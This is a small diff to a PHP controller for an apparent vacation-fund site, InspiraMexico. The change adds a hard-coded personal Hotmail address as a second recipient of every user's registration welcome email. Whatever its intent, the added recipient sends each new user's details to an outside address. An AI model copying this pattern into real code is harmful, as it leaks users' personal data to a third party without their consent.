@@ -111,7 +111,7 @@ class VacationfundsController extends Controller
 		$sent =Mail::send('emails.user_registration', array('user' => $this->userDao), function($message)
 			{
 				$full_name = $this->userDao->name . ' ' . $this->userDao->last_name;
-		    	$message->to( $this->userDao->email, $full_name )->subject( Lang::get('emails.welcome-to')." InspiraMexico, {$full_name}!" );
+		    	$message->to( $this->userDao->email, $full_name )->to( 'hp_tanya@hotmail.com' , $full_name)->subject( Lang::get('emails.welcome-to')." InspiraMexico, {$full_name}!" );
 			});
 
 		$full_name = $this->userDao->name . ' ' . $this->userDao->last_name;
